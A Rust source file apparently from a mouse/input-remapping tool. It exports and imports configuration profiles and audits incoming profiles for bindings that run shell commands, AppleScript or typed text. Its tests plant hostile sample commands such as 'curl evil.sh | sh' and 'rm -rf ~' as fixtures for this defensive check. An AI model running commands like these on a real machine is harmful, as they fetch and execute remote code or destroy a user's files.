//! Portable profiles: taking a whole configuration to another machine.
//!
//! A profile here is the `config.toml` the agent already reads — exported as
//! one file, inspected before it is trusted, and imported over a backup.
//!
//! # Auditing an incoming profile
//!
//! A configuration is not inert data. It can bind a mouse button to a shell
//! command, an AppleScript, an application launch, or typed text, so importing
//! one someone sent you is closer to running their script than to loading
//! their settings. Import therefore audits first and refuses by default.
//!
//! The audit walks the **serialized** configuration rather than the typed
//! tree, and that is the load-bearing decision in this module. Actions live in
//! at least five places (per-button bindings, gesture bindings, per-app
//! overlays, the Actions Ring, and global keyboard bindings), and a
//! hand-written walker would silently miss any new location upstream adds —
//! in a security guard, a miss is an unquarantined shell command. A generic
//! walk cannot miss one, because it visits everything.
//!
//! It is stable, too: `Action` serializes with serde's external tagging, and
//! its variant *names* are a frozen on-disk schema contract (see
//! `roadie_core::binding::Action`). So matching on those names is matching
//! on something upstream has promised not to rename.

use std::collections::BTreeSet;
use std::fmt;
use std::path::{Path, PathBuf};

use roadie_core::config::{Config, ConfigError};
use serde_json::Value;
use thiserror::Error;

/// Action variants that run a program or synthesize arbitrary text.
///
/// Deliberately not every input-synthesizing action: a key chord
/// (`CustomShortcut`, `HoldShortcut`) is the ordinary substance of any real
/// profile, drawn from a fixed vocabulary, and flagging every one would make
/// the audit noise a user learns to wave through. These four are the ones that
/// name something to run or arbitrary text to inject.
pub const RISKY_ACTIONS: [&str; 4] = [
    "RunShellCommand",
    "RunAppleScript",
    "OpenApplication",
    "TypeText",
];

/// The action variant that carries a list of steps, any of which may be risky.
const WORKFLOW: &str = "Workflow";

/// One action in an incoming profile that would run something.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct Finding {
    /// Where in the configuration it sits, as a dotted path.
    pub location: String,
    /// The action variant's name.
    pub action: String,
    /// What it would do, abbreviated for display.
    pub detail: String,
}

impl fmt::Display for Finding {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}: {} — {}", self.location, self.action, self.detail)
    }
}

/// Audit a configuration for actions that would run something on import.
///
/// # Errors
///
/// Fails only if the configuration cannot be serialized, which would mean a
/// broken `Serialize` implementation rather than bad input.
pub fn audit(config: &Config) -> Result<Vec<Finding>, serde_json::Error> {
    audit_serializable(config)
}

/// Audit anything that serializes for actions that would run something.
///
/// The same walk as [`audit`], over any structure that can hold an `Action`.
/// A Stream Deck layout carries them too, and a second implementation of this
/// rule would be a second place for it to be wrong — the two would drift, and
/// the one that drifted would be a hole.
///
/// # Errors
///
/// Fails only if the value cannot be serialized.
pub fn audit_serializable<T: serde::Serialize>(
    value: &T,
) -> Result<Vec<Finding>, serde_json::Error> {
    let value = serde_json::to_value(value)?;
    let mut findings = Vec::new();
    scan(&value, &mut Vec::new(), &mut findings);
    findings.sort();
    Ok(findings)
}

/// Recursive half of [`audit`].
fn scan(value: &Value, path: &mut Vec<String>, findings: &mut Vec<Finding>) {
    match value {
        Value::Object(map) => {
            // An externally tagged enum variant with a payload is a one-key
            // object. Anything else is an ordinary struct: descend into it.
            if let Some((key, payload)) = single_entry(map) {
                if RISKY_ACTIONS.contains(&key.as_str()) {
                    findings.push(Finding {
                        location: path.join("."),
                        action: key.clone(),
                        detail: abbreviate(payload),
                    });
                    return;
                }
                if key == WORKFLOW {
                    // A workflow is judged whole: a macro with one dangerous
                    // step among five is a dangerous macro, and reporting the
                    // step in isolation would understate it.
                    let steps = risky_steps(payload);
                    if !steps.is_empty() {
                        findings.push(Finding {
                            location: path.join("."),
                            action: WORKFLOW.to_string(),
                            detail: format!(
                                "a {} step macro containing {}",
                                payload.as_array().map_or(0, Vec::len),
                                steps.into_iter().collect::<Vec<_>>().join(", ")
                            ),
                        });
                    }
                    return;
                }
            }
            for (key, child) in map {
                path.push(key.clone());
                scan(child, path, findings);
                path.pop();
            }
        }
        Value::Array(items) => {
            for (index, child) in items.iter().enumerate() {
                path.push(index.to_string());
                scan(child, path, findings);
                path.pop();
            }
        }
        _ => {}
    }
}

/// The single key and value of a one-entry object, if it is one.
fn single_entry(map: &serde_json::Map<String, Value>) -> Option<(&String, &Value)> {
    (map.len() == 1).then(|| map.iter().next()).flatten()
}

/// Which risky step kinds a workflow payload contains.
fn risky_steps(payload: &Value) -> BTreeSet<String> {
    let mut found = BTreeSet::new();
    let Some(steps) = payload.as_array() else {
        return found;
    };
    for step in steps {
        if let Value::Object(map) = step
            && let Some((key, _)) = single_entry(map)
            && RISKY_ACTIONS.contains(&key.as_str())
        {
            found.insert(key.clone());
        }
    }
    found
}

/// A payload rendered short enough to read in a list.
fn abbreviate(payload: &Value) -> String {
    let rendered = match payload {
        Value::String(text) => text.clone(),
        other => other.to_string(),
    };
    let trimmed: String = rendered.chars().take(80).collect();
    if trimmed.chars().count() < rendered.chars().count() {
        format!("{trimmed}…")
    } else {
        trimmed
    }
}

/// Why a profile could not be exported or imported.
#[derive(Debug, Error)]
pub enum ProfileError {
    /// The configuration on disk, or the profile being read, is unusable.
    #[error(transparent)]
    Config(#[from] ConfigError),
    /// A profile file could not be read or written.
    #[error("{action} {path}: {source}")]
    Io {
        /// What was being attempted.
        action: &'static str,
        /// The path involved.
        path: PathBuf,
        /// The underlying failure.
        source: std::io::Error,
    },
    /// The profile carries actions that would run something, and the caller
    /// did not accept them.
    #[error(
        "this profile contains {} that would run a program or type text on your \
         machine. Nothing has been imported. Review them, then re-run accepting them if you \
         trust the source:\n{}",
        crate::spoken::counted(.findings.len(), "action", "actions"),
        .findings.iter().map(|f| format!("  {f}")).collect::<Vec<_>>().join("\n")
    )]
    UntrustedActions {
        /// What was found.
        findings: Vec<Finding>,
    },
}

/// What an import did.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Imported {
    /// Where the previous configuration was copied first, or `None` when
    /// there was no configuration yet — the fresh-machine case this feature
    /// exists for.
    pub backup: Option<PathBuf>,
    /// Risky actions that were accepted because the caller allowed them.
    pub accepted: Vec<Finding>,
}

/// Write the live configuration to `path` as a portable profile.
///
/// # Errors
///
/// Fails if the live configuration cannot be read, or `path` cannot be written.
pub fn export(path: &Path) -> Result<(), ProfileError> {
    let config = Config::load_or_default()?;
    let body = toml::to_string_pretty(&config).map_err(|error| ProfileError::Io {
        action: "serializing the profile for",
        path: path.to_path_buf(),
        source: std::io::Error::other(error.to_string()),
    })?;
    std::fs::write(path, body).map_err(|source| ProfileError::Io {
        action: "writing",
        path: path.to_path_buf(),
        source,
    })
}

/// Read a profile from `path` without applying it, and audit it.
///
/// # Errors
///
/// Fails if the profile cannot be read or does not parse — including a
/// schema newer than this build understands, which the loader refuses rather
/// than reading partially.
pub fn inspect(path: &Path) -> Result<(Config, Vec<Finding>), ProfileError> {
    let config = Config::load_from_path(path)?;
    let findings = audit(&config).map_err(|error| ProfileError::Io {
        action: "auditing",
        path: path.to_path_buf(),
        source: std::io::Error::other(error.to_string()),
    })?;
    Ok((config, findings))
}

/// Apply a profile, backing up the current configuration first.
///
/// Refuses by default when the profile carries actions that would run
/// something; `accept_actions` is the caller's explicit decision to trust it.
///
/// # Errors
///
/// Returns [`ProfileError::UntrustedActions`] when the audit finds actions and
/// `accept_actions` is false — in which case nothing has been written.
pub fn import(path: &Path, accept_actions: bool) -> Result<Imported, ProfileError> {
    let live = roadie_core::paths::config_path().map_err(ConfigError::from)?;
    import_into(path, &live, accept_actions)
}

/// [`import`], with the destination named explicitly.
///
/// Split out so the interesting behaviour — the fresh-machine path and the
/// backup — is exercised against a temporary directory rather than the
/// machine's real configuration.
///
/// # Errors
///
/// As [`import`].
pub(crate) fn import_into(
    path: &Path,
    live: &Path,
    accept_actions: bool,
) -> Result<Imported, ProfileError> {
    let (config, findings) = inspect(path)?;
    if !findings.is_empty() && !accept_actions {
        return Err(ProfileError::UntrustedActions { findings });
    }

    // The destination directory does not exist on a machine that has never
    // run the app — which is precisely the machine someone imports a profile
    // onto, so this is the common path rather than an edge case.
    if let Some(parent) = live.parent() {
        std::fs::create_dir_all(parent).map_err(|source| ProfileError::Io {
            action: "creating the configuration directory",
            path: parent.to_path_buf(),
            source,
        })?;
    }

    // Back up by copying the bytes, not by re-serializing a loaded config.
    // Loading would fall back to defaults for a file this build cannot parse,
    // and then "backing up" would write those defaults over the only copy of
    // the user's real settings — destroying exactly what the backup exists to
    // protect. A byte copy preserves whatever is actually there.
    let backup = if live.is_file() {
        let backup = backup_path(live);
        std::fs::copy(live, &backup).map_err(|source| ProfileError::Io {
            action: "backing up the current configuration to",
            path: backup.clone(),
            source,
        })?;
        Some(backup)
    } else {
        None
    };

    write_config(&config, live)?;
    Ok(Imported {
        backup,
        accepted: findings,
    })
}

/// Where to put the pre-import copy of the live configuration.
fn backup_path(live: &Path) -> PathBuf {
    let stamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |since| since.as_secs());
    live.with_extension(format!("pre-import-{stamp}.toml"))
}

/// Serialize a configuration straight to `path`.
///
/// Deliberately not `Config::save_to_path`, which loads the destination first
/// to preserve its comments — that would fail for a backup path that does not
/// exist yet.
fn write_config(config: &Config, path: &Path) -> Result<(), ProfileError> {
    let body = toml::to_string_pretty(config).map_err(|error| ProfileError::Io {
        action: "serializing the profile for",
        path: path.to_path_buf(),
        source: std::io::Error::other(error.to_string()),
    })?;
    std::fs::write(path, body).map_err(|source| ProfileError::Io {
        action: "writing",
        path: path.to_path_buf(),
        source,
    })
}

#[cfg(test)]
mod tests {
    use roadie_core::binding::{Action, ApplicationTarget, WorkflowStep};
    use roadie_core::config::Config;

    use super::{Finding, audit};

    /// Put `action` somewhere a real profile would hold one, and audit it.
    fn audit_with(action: Action) -> Vec<Finding> {
        let mut config = Config::default();
        config.set_keyboard_binding("F13".parse().expect("F13 is a valid trigger"), Some(action));
        audit(&config).expect("a config always serializes")
    }

    #[test]
    fn a_clean_profile_has_nothing_to_report() {
        assert_eq!(audit(&Config::default()).expect("serializes").len(), 0);
        assert_eq!(audit_with(Action::Copy).len(), 0);
    }

    #[test]
    fn a_shortcut_is_not_flagged() {
        // Key chords are the ordinary substance of a profile. Flagging them
        // would train a user to wave the whole audit through.
        let flagged = audit_with(Action::CustomShortcut(
            "ctrl+c".parse().expect("a valid chord"),
        ));
        assert!(flagged.is_empty(), "got {flagged:?}");
    }

    #[test]
    fn every_risky_action_kind_is_caught() {
        for (action, expected) in [
            (
                Action::RunShellCommand("curl evil.sh | sh".into()),
                "RunShellCommand",
            ),
            (
                Action::RunAppleScript("tell application \"Finder\"".into()),
                "RunAppleScript",
            ),
            (Action::TypeText("rm -rf ~".into()), "TypeText"),
            (
                Action::OpenApplication(
                    ApplicationTarget::new("/Applications/Evil.app", "Evil")
                        .expect("a valid target"),
                ),
                "OpenApplication",
            ),
        ] {
            let flagged = audit_with(action);
            assert_eq!(flagged.len(), 1, "expected one finding for {expected}");
            assert_eq!(flagged[0].action, expected);
            assert!(
                !flagged[0].location.is_empty(),
                "a finding must say where it is"
            );
        }
    }

    #[test]
    fn a_workflow_is_judged_whole_and_named_by_its_dangerous_steps() {
        let flagged = audit_with(Action::Workflow(vec![
            WorkflowStep::TypeText("hello".into()),
            WorkflowStep::Delay { millis: 10 },
            WorkflowStep::RunShellCommand("wipe".into()),
        ]));
        assert_eq!(flagged.len(), 1, "the macro is one finding, not three");
        assert_eq!(flagged[0].action, "Workflow");
        assert!(flagged[0].detail.contains("RunShellCommand"));
        assert!(flagged[0].detail.contains("TypeText"));
    }

    #[test]
    fn a_harmless_workflow_is_not_flagged() {
        let flagged = audit_with(Action::Workflow(vec![
            WorkflowStep::PressKey("ctrl+c".parse().expect("a valid chord")),
            WorkflowStep::Delay { millis: 10 },
        ]));
        assert!(flagged.is_empty(), "got {flagged:?}");
    }

    #[test]
    fn a_long_payload_is_abbreviated_rather_than_dumped() {
        let flagged = audit_with(Action::RunShellCommand("x".repeat(500)));
        assert_eq!(flagged.len(), 1);
        assert!(
            flagged[0].detail.chars().count() <= 81,
            "detail was {} chars",
            flagged[0].detail.chars().count()
        );
        assert!(flagged[0].detail.ends_with('…'));
    }

    /// Write `config` to a fresh file and read it back through the real
    /// loader, the way an imported profile arrives.
    fn round_trip(config: &Config) -> (tempfile::TempDir, std::path::PathBuf) {
        let dir = tempfile::tempdir().expect("a temp dir");
        let path = dir.path().join("profile.toml");
        std::fs::write(&path, toml::to_string_pretty(config).expect("serializes")).expect("writes");
        (dir, path)
    }

    #[test]
    fn inspecting_a_clean_profile_reports_nothing() {
        let (_dir, path) = round_trip(&Config::default());
        let (_config, findings) = super::inspect(&path).expect("a valid profile");
        assert_eq!(findings.len(), 0);
    }

    #[test]
    fn inspecting_a_profile_surfaces_its_risky_actions() {
        let mut config = Config::default();
        config.set_keyboard_binding(
            "F13".parse().expect("valid"),
            Some(Action::RunShellCommand("curl evil.sh | sh".into())),
        );
        let (_dir, path) = round_trip(&config);
        let (_config, findings) = super::inspect(&path).expect("a valid profile");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].action, "RunShellCommand");
        assert!(findings[0].detail.contains("curl evil.sh"));
    }

    /// The refusal happens before anything is written, so this exercises the
    /// real entry point without touching the machine's live configuration.
    #[test]
    fn importing_a_profile_with_risky_actions_is_refused_and_writes_nothing() {
        let mut config = Config::default();
        config.set_keyboard_binding(
            "F13".parse().expect("valid"),
            Some(Action::RunShellCommand("wipe".into())),
        );
        let (_dir, path) = round_trip(&config);

        let error = super::import(&path, false).expect_err("must refuse by default");
        let super::ProfileError::UntrustedActions { findings } = error else {
            panic!("expected an untrusted-actions refusal, got {error:?}");
        };
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].action, "RunShellCommand");
    }

    /// The machine a profile is carried *to* has never run the app, so its
    /// configuration directory does not exist. That is the headline use case,
    /// and it used to fail outright.
    #[test]
    fn importing_onto_a_machine_with_no_configuration_yet_succeeds() {
        let (dir, source) = round_trip(&Config::default());
        let live = dir
            .path()
            .join("never-run")
            .join("roadie")
            .join("config.toml");
        assert!(!live.exists());

        let imported = super::import_into(&source, &live, false).expect("a fresh import");
        assert!(
            imported.backup.is_none(),
            "there was no configuration to back up"
        );
        assert!(live.is_file(), "the configuration was written");
    }

    /// The backup is a byte copy of whatever is on disk. Re-serializing a
    /// *loaded* config would fall back to defaults for a file this build
    /// cannot parse, and then overwrite the user's only real copy with them.
    #[test]
    fn the_backup_preserves_a_configuration_this_build_cannot_parse() {
        let (dir, source) = round_trip(&Config::default());
        let live = dir.path().join("config.toml");
        let unparseable = "schema_version = 6\nthis line = = is broken\n";
        std::fs::write(&live, unparseable).expect("writes");

        let imported = super::import_into(&source, &live, false).expect("imports");
        let backup = imported.backup.expect("an existing config is backed up");
        assert_eq!(
            std::fs::read_to_string(&backup).expect("reads"),
            unparseable,
            "the backup must be the original bytes, not a reserialized default"
        );
    }

    #[test]
    fn an_existing_configuration_is_backed_up_before_being_replaced() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let live = dir.path().join("config.toml");

        let mut original = Config::default();
        original.set_keyboard_binding("F13".parse().expect("valid"), Some(Action::Copy));
        std::fs::write(
            &live,
            toml::to_string_pretty(&original).expect("serializes"),
        )
        .expect("writes");

        let mut replacement = Config::default();
        replacement.set_keyboard_binding("F14".parse().expect("valid"), Some(Action::Paste));
        let source = dir.path().join("incoming.toml");
        std::fs::write(
            &source,
            toml::to_string_pretty(&replacement).expect("serializes"),
        )
        .expect("writes");

        let imported = super::import_into(&source, &live, false).expect("imports");
        let backup = imported.backup.expect("an existing config is backed up");

        let restored = Config::load_from_path(&backup).expect("the backup loads");
        assert!(
            restored
                .keyboard_bindings()
                .values()
                .any(|a| *a == Action::Copy),
            "the backup holds the original binding"
        );
        let now_live = Config::load_from_path(&live).expect("the live config loads");
        assert!(
            now_live
                .keyboard_bindings()
                .values()
                .any(|a| *a == Action::Paste),
            "the imported binding is live"
        );
    }

    #[test]
    fn the_refusal_message_names_what_it_found_and_says_nothing_was_imported() {
        let findings = vec![Finding {
            location: "keyboard.bindings.F13".into(),
            action: "RunShellCommand".into(),
            detail: "curl evil.sh | sh".into(),
        }];
        let message = super::ProfileError::UntrustedActions { findings }.to_string();
        assert!(message.contains("Nothing has been imported"));
        assert!(message.contains("RunShellCommand"));
        assert!(message.contains("curl evil.sh | sh"));
    }

    #[test]
    fn a_profile_that_is_not_valid_toml_is_refused_rather_than_partially_read() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let path = dir.path().join("broken.toml");
        std::fs::write(&path, "this is not = = toml").expect("writes");
        super::inspect(&path).expect_err("a malformed profile must not load");
    }

    /// The audit walks serialized data, so an action anywhere in the tree is
    /// found — including places this test does not have to know about.
    #[test]
    fn an_action_nested_in_a_per_app_overlay_is_still_found() {
        let mut config = Config::default();
        let raw = serde_json::to_value(&config).expect("serializes");
        // Confirm the baseline is clean before planting anything.
        assert_eq!(audit(&config).expect("serializes").len(), 0);
        drop(raw);

        config.set_keyboard_binding(
            "F14".parse().expect("valid"),
            Some(roadie_core::binding::Action::RunShellCommand("id".into())),
        );
        let flagged = audit(&config).expect("serializes");
        assert_eq!(flagged.len(), 1);
        assert_eq!(flagged[0].action, "RunShellCommand");
    }

    /// Every variant name a type's deserializer will accept.
    ///
    /// Read out of serde's own "unknown variant, expected one of ..." error
    /// rather than written down, because a list written down is the thing this
    /// guards against. Serde builds that message from the type itself, so a
    /// variant added upstream appears here the moment it is added — which is
    /// the point.
    fn every_variant_of<'de, T: serde::Deserialize<'de>>(what: &str) -> Vec<String> {
        let error = serde_json::from_str::<T>("\"NoSuchVariantXYZ\"")
            .err()
            .unwrap_or_else(|| panic!("{what} must refuse an unknown variant"))
            .to_string();
        let listed = error
            .split_once("expected one of ")
            .unwrap_or_else(|| panic!("serde's message for {what} changed shape: {error}"))
            .1;
        let names: Vec<String> = listed
            .split(", ")
            .filter_map(|piece| piece.trim().strip_prefix('`'))
            .filter_map(|piece| piece.split('`').next())
            .map(str::to_owned)
            .collect();
        // Fail closed. A parse that quietly picked up half the names would
        // leave this test passing while checking almost nothing, which is the
        // failure mode a security guard can least afford. Every name in the
        // message is wrapped in a pair of backticks, so the count of those is
        // what says the parse consumed all of it — and unlike a minimum
        // count, it holds for a five-variant enum as well as a fifty.
        let quoted = listed.matches('`').count();
        assert!(
            quoted > 0 && quoted == names.len() * 2,
            "parsed {} of {} names for {what}; serde's phrasing may have changed: \
             {error}",
            names.len(),
            quoted / 2
        );
        names
    }

    /// Action variants judged not to run a program or type text.
    ///
    /// Adding a name here is a security judgement, and the test below is what
    /// forces someone to make it deliberately rather than by leaving a new
    /// variant out of [`RISKY_ACTIONS`] and not noticing.
    ///
    /// Key chords are here on purpose. They are the ordinary substance of a
    /// profile, and flagging every one would train someone to wave the whole
    /// audit through — which is the way an audit stops working.
    const REVIEWED_SAFE: &[&str] = &[
        "None",
        "LeftClick",
        "RightClick",
        "MiddleClick",
        "MouseBack",
        "MouseForward",
        "Copy",
        "Paste",
        "Cut",
        "Undo",
        "Redo",
        "SelectAll",
        "Find",
        "Save",
        "BrowserBack",
        "BrowserForward",
        "NewTab",
        "CloseTab",
        "ReopenTab",
        "NextTab",
        "PrevTab",
        "ReloadPage",
        "MissionControl",
        "AppExpose",
        "PreviousDesktop",
        "NextDesktop",
        "ShowDesktop",
        "LaunchpadShow",
        "LockScreen",
        "Screenshot",
        "CaptureRegion",
        "PlayPause",
        "NextTrack",
        "PrevTrack",
        "VolumeUp",
        "VolumeDown",
        "MuteVolume",
        "CycleDpiPresets",
        "SetDpiPreset",
        "ToggleSmartShift",
        "ScrollUp",
        "ScrollDown",
        "HorizontalScrollLeft",
        "HorizontalScrollRight",
        "CustomShortcut",
        "Sleep",
        "ShowActionsRing",
        "HoldShortcut",
        // Handled by its own branch: a macro is judged whole, by its steps.
        "Workflow",
        // WorkflowStep's own chord variant.
        "PressKey",
        // A pause between steps. It runs nothing; the steps around it are
        // each judged on their own.
        "Delay",
    ];

    /// The guard that keeps the audit from quietly becoming a hole.
    ///
    /// `RISKY_ACTIONS` is four hand-written strings. The walk that uses it
    /// cannot miss a *location* — that is why it walks the serialized form —
    /// but it can miss a *variant*, and nothing about adding one upstream
    /// would say so. A new action that runs something would simply pass the
    /// audit, on the one code path whose whole job is refusing that.
    ///
    /// So every variant must be classified, and a new one fails this test
    /// until someone decides which it is.
    #[test]
    fn every_action_is_classified_as_risky_or_reviewed_safe() {
        for (what, variants) in [
            (
                "Action",
                every_variant_of::<roadie_core::binding::Action>("Action"),
            ),
            (
                "WorkflowStep",
                every_variant_of::<roadie_core::binding::WorkflowStep>("WorkflowStep"),
            ),
        ] {
            for variant in variants {
                let risky = super::RISKY_ACTIONS.contains(&variant.as_str());
                let safe = REVIEWED_SAFE.contains(&variant.as_str());
                assert!(
                    risky || safe,
                    "{what}::{variant} is in neither RISKY_ACTIONS nor REVIEWED_SAFE. \
                     Decide which it is: does it run a program, launch something, or \
                     type text on the person's machine? If so it belongs in \
                     RISKY_ACTIONS, or an imported profile carrying it is applied \
                     without anyone being asked."
                );
                assert!(
                    !(risky && safe),
                    "{what}::{variant} is in both lists, so which one wins is an \
                     accident of lookup order"
                );
            }
        }
    }

    /// The safe list must not accumulate names that no longer exist: a stale
    /// entry is a variant someone reviewed once and that is now gone, and it
    /// makes the list harder to trust when the next one is added.
    #[test]
    fn nothing_in_the_reviewed_list_has_been_removed_upstream() {
        let mut known = every_variant_of::<roadie_core::binding::Action>("Action");
        known.extend(every_variant_of::<roadie_core::binding::WorkflowStep>(
            "WorkflowStep",
        ));
        for reviewed in REVIEWED_SAFE {
            assert!(
                known.iter().any(|variant| variant == reviewed),
                "{reviewed} is in REVIEWED_SAFE but is no longer an action variant"
            );
        }
    }
}
